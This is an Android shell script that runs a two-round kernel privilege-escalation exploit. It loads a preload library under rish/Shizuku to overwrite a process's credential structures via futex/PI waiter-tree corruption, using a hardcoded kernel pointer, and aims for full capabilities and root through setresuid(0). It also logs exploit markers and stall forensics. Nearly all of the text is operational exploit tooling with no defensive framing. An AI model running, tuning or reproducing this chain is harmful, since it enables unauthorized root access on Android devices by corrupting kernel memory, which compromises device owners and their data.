#!/system/bin/sh
# E4b: R -> E4 two-process chain (mt72, 2026-09-02)
#
# Round 1 (R): standard fork R round — main tree writes real_cred@0x778
#   (proven geometry, 7/7). Gate: CapEff full in child status.
# Round 2 (E4): ONLY if R landed — external mode PSELECT_TASK=<child task>,
#   PSELECT_PTR_PI=1 — pi tree writes cred@0x780 on the SAME child.
#   One process per write (crash#2 lesson: same-process second trigger
#   rebalances on the poisoned waiter tree).
#
# NO mt64 chmod-000 blinding in round 2: mt51 uses C semantics (euid==0)
# in PI rounds, so a CapEff-full status file (from R) does NOT false-abort.
#
# Success: root_alive.txt appears OR child status shows CapEff full && euid=0
#   (AND-gate hits -> setresuid(0) -> root).
# Round-1 miss: rerun later; do NOT force round 2 without an R-landed child.
#
# E2 forensics: 1s sampler runs across BOTH rounds.
#
# Run via rish/Shizuku after deploying mt72 preload.so.
NAME=E4b
LOG=/data/local/tmp/${NAME}_log.txt
SNAP=/data/local/tmp/${NAME}_snap.txt
echo "=== E4b chain start $(date +%H:%M:%S) boot=$(cat /proc/sys/kernel/random/boot_id) ===" > $LOG
# 2026-09-03: load gate — refuse to fire while 1-min loadavg > 10.
# Starvation is self-induced by heavy D-state work under load; running
# during high load only wastes rounds and can cause soft-restart storms.
LOAD=$(cut -d' ' -f1 /proc/loadavg 2>/dev/null || echo 0)
LOAD_INT=${LOAD%.*}
if [ "${LOAD_INT:-0}" -gt 10 ]; then
  echo "load gate: 1-min loadavg=$LOAD >10, refuse to run; wait for recovery"
  exit 2
fi

am kill-all 2>/dev/null
rm -f /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt /data/local/tmp/R.out /data/local/tmp/E4x.out $SNAP

(while :; do
  for p in $(pgrep -f "sleep 180" 2>/dev/null); do
    echo "$(date +%H:%M:%S) pid=$p comm=$(cat /proc/$p/comm 2>/dev/null) state=$(cut -d' ' -f3 /proc/$p/stat 2>/dev/null) $(cat /data/local/tmp/mt49_child_status.txt 2>/dev/null)"
  done
  sleep 1
done) > $SNAP 2>&1 &
SAMPLER=$!

echo "--- round 1: R fork ---" >> $LOG
timeout 250 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R \
  PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 \
  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
  PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
  PSELECT_NO_CANARY=1 \
  LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 \
  > /data/local/tmp/R.out 2>&1
RRC=$?
echo "R rc=$RRC enforce=$(getenforce)" >> $LOG

ST=$(cat /data/local/tmp/mt49_child_status.txt 2>/dev/null)
echo "R gate status: $ST" >> $LOG
TASK=$(printf '%s' "$ST" | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1)
if printf '%s' "$ST" | grep -q "CapEff=0000000000000000"; then
  echo "R MISS — skip E4 round (no R-landed child). Retry script later." >> $LOG
  kill $SAMPLER 2>/dev/null
  cp /data/local/tmp/R.out /data/local/tmp/${NAME}_R.out 2>/dev/null
  cat $LOG
  exit 0
fi
if [ -z "$TASK" ]; then
  echo "no task= in status file — abort E4 round" >> $LOG
  kill $SAMPLER 2>/dev/null
  cat $LOG
  exit 0
fi

echo "--- round 2: E4 external TASK=$TASK ---" >> $LOG
sleep 5
timeout 250 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 PSELECT_PTR_PI=1 \
  PSELECT_PTR_VALUE=ffffff80027b0ae0 \
  PSELECT_PTR_STRICT=1 \
  PSELECT_TASK=$TASK \
  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
  PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
  PSELECT_NO_CANARY=1 \
  LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 \
  > /data/local/tmp/E4x.out 2>&1
XRC=$?
kill $SAMPLER 2>/dev/null

echo "E4 rc=$XRC enforce=$(getenforce) boot=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
echo "--- final child status ---" >> $LOG
cat /data/local/tmp/mt49_child_status.txt 2>/dev/null >> $LOG
echo "--- root_alive ---" >> $LOG
cat /data/local/tmp/root_alive.txt 2>/dev/null >> $LOG
echo "--- R markers ---" >> $LOG
grep -a "mt33: child pid\|mt48: PTR\|mt51:\|mt25: futex trigger\|pselect returned\|mt47: ROOT-SEEN" /data/local/tmp/R.out 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | head -20 >> $LOG
echo "--- E4 markers ---" >> $LOG
grep -a "mt49: external\|mt72: PI-write\|mt51:\|mt66:\|mt25: futex trigger\|mt19b\|pselect returned\|mt47: ROOT-SEEN\|mt59: STALL" /data/local/tmp/E4x.out 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | head -30 >> $LOG
echo "--- E2 sampler tail (last 30 lines) ---" >> $LOG
tail -30 $SNAP >> $LOG 2>/dev/null
cat $LOG
